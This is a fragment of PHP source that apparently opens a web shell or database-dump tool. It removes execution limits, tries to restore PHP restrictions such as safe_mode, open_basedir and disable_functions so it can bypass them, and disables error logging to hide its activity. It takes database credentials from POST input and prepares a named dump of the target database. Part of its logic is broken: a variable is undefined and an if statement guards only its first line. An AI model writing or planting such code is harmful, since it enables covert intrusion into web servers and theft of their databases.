<?php
session_start();
@set_time_limit(0);
@ini_restore("safe_mode");
@ini_restore("allow_url_fopen");
@ini_restore("open_basedir");
@ini_restore("disable_functions");
@ini_restore("safe_mode_exec_dir");
@ini_restore("safe_mode_include_dir");


@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$php = $_SERVER["PHP_SELF"];

define('db',htmlspecialchars($_POST['sqdbn']));
define('pass',htmlspecialchars($_POST['sqpwd']));
define('loc',htmlspecialchars($_POST['sqsrv'])? htmlspecialchars($_POST['sqsrv']):$log);
define('port',htmlspecialchars($_POST['sqprt']));
define('user',htmlspecialchars($_POST['sqlog']));

if(isset($_REQUEST['dumd']))
    $dt = date("Y-m-d");$db = $_POST['sqdbn'];$han = "WDLL-$db-$dt";$dmt = $_REQUEST['sqldp'];
?>